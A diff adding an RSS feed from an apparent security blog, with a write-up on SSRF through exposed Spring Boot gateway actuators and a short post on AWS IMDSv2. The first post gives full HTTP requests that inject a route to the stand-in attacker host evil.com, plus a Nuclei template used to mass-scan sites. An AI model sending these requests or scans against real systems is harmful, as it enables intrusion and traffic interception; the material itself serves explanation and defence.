@@ -1,0 +1,180 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Welcome</title>
+    <link>https://si9int.sh/</link>
+    <description>Recent content on Welcome</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 01 Jan 2022 02:01:58 +0530</lastBuildDate>
+    
+        <atom:link href="https://si9int.sh/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>&#34;Spring Boot&#34;-Actuators and SSRF</title>
+        <link>https://si9int.sh/posts/spring-boot-ssrf/</link>
+        <pubDate>Sat, 01 Jan 2022 02:01:58 +0530</pubDate>
+        
+        <guid>https://si9int.sh/posts/spring-boot-ssrf/</guid>
+        <description>Welcome https://si9int.sh/posts/spring-boot-ssrf/ -&lt;h2 id=&#34;1-intro&#34;&gt;1. Intro&lt;/h2&gt;
+&lt;p&gt;A respective colleague of mine Wyatt Dahlenburg recently described in a blog article how a mis-configured &amp;ldquo;Spring Boot&amp;rdquo; application can be used to create an opportunity for SSRF (Server Side Request Forgery) attacks.&lt;/p&gt;
+&lt;p&gt;The &amp;ldquo;Spring Framework&amp;rdquo; is an application framework designed for the Java development platform and commonly used to develop web applications like REST-APIs. The &amp;ldquo;Spring Boot&amp;rdquo; extension provides a &amp;ldquo;ready to run&amp;rdquo; environment which allows creating (standalone) Spring-based applications. These standalone applications can be extended through a module called &lt;code&gt;spring-boot-actuator&lt;/code&gt; to append so called &amp;ldquo;production-ready features&amp;rdquo; via actuators. &amp;ldquo;Actuators&amp;rdquo; are basically providing administrative functionality for controlling the application flow (e.g. downstream) or monitoring specific functional behavior of the application itself.&lt;/p&gt;
+&lt;p&gt;An example for a &amp;ldquo;Spring Boot&amp;rdquo; actuator would be the &lt;code&gt;/actuator/health&lt;/code&gt; endpoint which returns &lt;code&gt;UP&lt;/code&gt; if everything runs as intended. Each of these individual endpoints can be enabled or disabled and exposed over HTTP or JMX (Java Management Extensions; an infrastructure for managing Java applications locally or remotely). Some of these endpoints are exposed by default (e.g. the above described &lt;code&gt;health&lt;/code&gt;-actuator), a possibility which can be used by an attacker to produce information disclosure. Since v.2+ &amp;ldquo;Spring Boot&amp;rdquo; discloses enabled actuators when visiting the endpoint &lt;code&gt;/actuator&lt;/code&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;2-the-gateway-actuator&#34;&gt;2. The &lt;code&gt;gateway&lt;/code&gt;-Actuator&lt;/h2&gt;
+&lt;p&gt;In his blog Wyatt Dahlenburg described how he stumbled across an enabled &lt;code&gt;gateway&lt;/code&gt;-actuator which allows viewing configured routes of the application if extended with &lt;code&gt;/routes&lt;/code&gt; (&lt;code&gt;/actuator/gateway/routes&lt;/code&gt;; a direct request results in a HTTP-response of status-code 404).&lt;/p&gt;
+&lt;p&gt;Routes allow developers to define conditions how application traffic can be proxied using the gateway application (in this case the &amp;ldquo;Spring Boot&amp;rdquo; application) to downstream applications. These routes can be resolved by different protocols using different URI schemes such as &lt;code&gt;http://&lt;/code&gt;, &lt;code&gt;https://&lt;/code&gt;, &lt;code&gt;ws://&lt;/code&gt; (Web-Socket), &lt;code&gt;wss://&lt;/code&gt; (Web-Socket over HTTPS) and &lt;code&gt;lb://&lt;/code&gt; (Load Balancer). According to the documentation:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;ID&lt;/th&gt;
+&lt;th&gt;HTTP-Method&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;globalfilters&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;GET&lt;/td&gt;
+&lt;td&gt;Displays the list of global filters applied to the routes.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;routefilters&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;GET&lt;/td&gt;
+&lt;td&gt;Displays the list of &lt;code&gt;GatewayFilter&lt;/code&gt; factories applied to a particular route.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;refresh&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;POST&lt;/td&gt;
+&lt;td&gt;Clears the routes cache.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;routes&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;GET&lt;/td&gt;
+&lt;td&gt;Displays the list of routes defined in the gateway.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;routes/{id}&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;GET&lt;/td&gt;
+&lt;td&gt;Displays information about a particular route.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;routes/{id}&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;POST&lt;/td&gt;
+&lt;td&gt;Adds a new route to the gateway.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;routes/{id}&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;DELETE&lt;/td&gt;
+&lt;td&gt;Removes an existing route from the gateway.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Here comes the opportunity of creating a SSRF into play. By sending a HTTP-POST request to the unprotected actuator it is possible to define a new route with the ID &amp;ldquo;new_route&amp;rdquo; which proxify traffic from &lt;code&gt;/new-route&lt;/code&gt; to an attacker-controlled domain called &lt;code&gt;evil.com&lt;/code&gt; over the HTTP-protocol:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /actuator/gateway/routes/new_route HTTP/1.1
+Host: 127.0.0.1:80
+Connection: close
+Content-Type: application/json
+
+{
+  &amp;quot;predicates&amp;quot;: [
+    {
+      &amp;quot;name&amp;quot;: &amp;quot;Path&amp;quot;,
+      &amp;quot;args&amp;quot;: {
+        &amp;quot;_genkey_0&amp;quot;: &amp;quot;/new_route/**&amp;quot;
+      }
+    }
+  ],
+  &amp;quot;filters&amp;quot;: [
+    {
+      &amp;quot;name&amp;quot;: &amp;quot;RewritePath&amp;quot;,
+      &amp;quot;args&amp;quot;: {
+        &amp;quot;_genkey_0&amp;quot;: &amp;quot;/new_route(?&amp;lt;path&amp;gt;.*)&amp;quot;,
+        &amp;quot;_genkey_1&amp;quot;: &amp;quot;/${path}&amp;quot;
+      }
+    }
+  ],
+  &amp;quot;uri&amp;quot;: &amp;quot;https://evil.com&amp;quot;,
+  &amp;quot;order&amp;quot;: 0
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A second HTTP-Post request refreshes the gateway and enables the evil route.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /actuator/gateway/refresh HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/json
+Connection: close
+Content-Length: 230
+
+{
+  &amp;quot;predicate&amp;quot;: &amp;quot;Paths: [/new_route], match trailing slash: true&amp;quot;,
+  &amp;quot;route_id&amp;quot;: &amp;quot;new_route&amp;quot;,
+  &amp;quot;filters&amp;quot;: [
+    &amp;quot;[[RewritePath /new_route(?&amp;lt;path&amp;gt;.*) = /${path}], order = 1]&amp;quot;
+  ],
+  &amp;quot;uri&amp;quot;: &amp;quot;https://evil.com&amp;quot;,
+  &amp;quot;order&amp;quot;: 0
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It should be noticed that actuators are only stored in memory. If an administrator detects such behavior an application-restart will be enough to make modifications of the &lt;code&gt;gateway&lt;/code&gt;-actuator vanish.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;3-mass-detection&#34;&gt;3. Mass-Detection&lt;/h2&gt;
+&lt;p&gt;The idea of catching low-hanging fruits through mis-configured &amp;ldquo;Spring Boot&amp;rdquo; actuators led me into the creation of a &amp;ldquo;Nuclei&amp;rdquo;-template:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;id: spring-boot-actuator
+
+info: 
+  name: Spring Boot Actuator
+  description: Detects if a host is deployed via Spring Boot and is using publicly accessible actuators
+  author: SI9INT
+
+requests:
+  - method: GET
+    headers:
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+      Origin: https://google.de
+    path:
+      - &amp;quot;{{BaseURL}}/actuator&amp;quot;
+
+    matchers-condition: and
+    matchers:
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - &amp;quot;templated&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Running Nuclei against a German subset of the &amp;ldquo;Majestic Million&amp;rdquo; (&lt;a href=&#34;https://majestic.com/reports/majestic-million&#34;&gt;https://majestic.com/reports/majestic-million&lt;/a&gt;) led to few but interesting results.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Sources:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/&#34;&gt;https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.baeldung.com/java-management-extensions&#34;&gt;https://www.baeldung.com/java-management-extensions&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://de.wikipedia.org/wiki/Spring_(Framework)&#34;&gt;https://de.wikipedia.org/wiki/Spring_(Framework)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://spring.io/projects/spring-boot#overview&#34;&gt;https://spring.io/projects/spring-boot#overview&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html&#34;&gt;https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+- https://si9int.sh/posts/spring-boot-ssrf/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>AWS Tackling Server Side Request Forgery</title>
+        <link>https://si9int.sh/posts/aws-tackling-ssrf/</link>
+        <pubDate>Wed, 15 Dec 2021 02:01:58 +0530</pubDate>
+        
+        <guid>https://si9int.sh/posts/aws-tackling-ssrf/</guid>
+        <description>Welcome https://si9int.sh/posts/aws-tackling-ssrf/ -&lt;p&gt;New Amazon EC2 (Amazon Elastic Compute Cloud) instances are capable of defending exploitation attempts using common GET-based SSRF (Server Side Request Forgery) vulnerabilities. The IMDSv2 (Instance Metadata Service Version 2) now mitigates such endeavour by restricting the metadata service using conditional authentication:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;A HTTP-PUT request to &lt;code&gt;169.254.169.254/latest/api/token&lt;/code&gt; needs to be made for generating a token using a custom HTTP-header &lt;code&gt;x-aws-ec2-metadata-token-ttl-seconds&lt;/code&gt; which holds the number of seconds the requested token is valid for.&lt;/li&gt;
+&lt;li&gt;The requested token needs to be delivered via a new custom HTTP-header called &lt;code&gt;x-aws-ec2-metadata-token&lt;/code&gt; when interacting with the Instance Metadata Service.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;This will successfully eliminate GET-based SSRF in AWS environments.&lt;/p&gt;
+- https://si9int.sh/posts/aws-tackling-ssrf/ - </description>
+        </item>
+    
+    
+    
+    
+  </channel>
+</rss> 
